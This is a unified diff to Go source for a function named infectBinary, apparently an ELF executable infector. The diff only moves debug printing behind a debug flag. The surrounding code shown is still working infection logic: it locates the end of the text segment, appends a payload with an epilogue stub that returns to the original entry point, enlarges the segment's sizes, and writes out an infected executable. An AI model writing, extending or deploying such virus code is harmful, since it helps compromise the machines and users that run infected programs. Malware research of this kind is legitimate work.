@@ -162,19 +162,25 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 			}
 			//[5] && [6]
 			textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
-			fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd)
-			fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", len(payload64))
-
+			if debug {
+				fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd)
+				fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", len(payload64))
+			}
+			
 			retStub = modEpilogue64(int32(len(payload64) + 5), elfHeader.Entry, oEntry)
 			payload64 = append(payload64, retStub...)
-			fmt.Printf("[+] Payload size post-epilogue 0x%x\n", len(payload64))
 
-			fmt.Print("[")
-			for _, h := range payload64 {
-				fmt.Printf("0x%02x ", h)
+			if debug {
+				fmt.Printf("[+] Payload size post-epilogue 0x%x\n", len(payload64))
+						
+				fmt.Println("------------------PAYLOAD----------------------------")
+				fmt.Print("[")
+				for _, h := range payload64 {
+					fmt.Printf("0x%02x ", h)
+				}
+				fmt.Println("]")
+				fmt.Println("--------------------END------------------------------")
 			}
-			fmt.Println("]")
-
 			pHeaders[i].Memsz += uint64(len(payload64))
 			pHeaders[i].Filesz += uint64(len(payload64))
 			if debug {
@@ -236,13 +242,18 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 	binary.Write(infectedShdrTable, binary.LittleEndian, sectionHdrTable)
 
 	finalInfectionTwo := make([]byte, infectedBuf.Len()+int(PAGE_SIZE))
-	fmt.Println("Infected buf len  => ", infectedBuf.Len())
+	if debug {
+		fmt.Println("Infected buf len  => ", infectedBuf.Len())
+	}
 	finalInfection := infectedBuf.Bytes()
 
 	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())
 
 	end_of_infection := int(textSegEnd)
-	fmt.Printf("end_of_infection @ 0x%x\n", end_of_infection)
+	if debug {
+		fmt.Printf("end_of_infection @ 0x%x\n", end_of_infection)
+	}
+	
 	copy(finalInfectionTwo, finalInfection[:end_of_infection])
 	if debug {
 		fmt.Println("[+] writing payload into the binary")
@@ -253,8 +264,9 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 	err = ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751)
 	checkError(err)
-	fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))
-
+	if debug {
+		fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))
+	}
 }
 
 
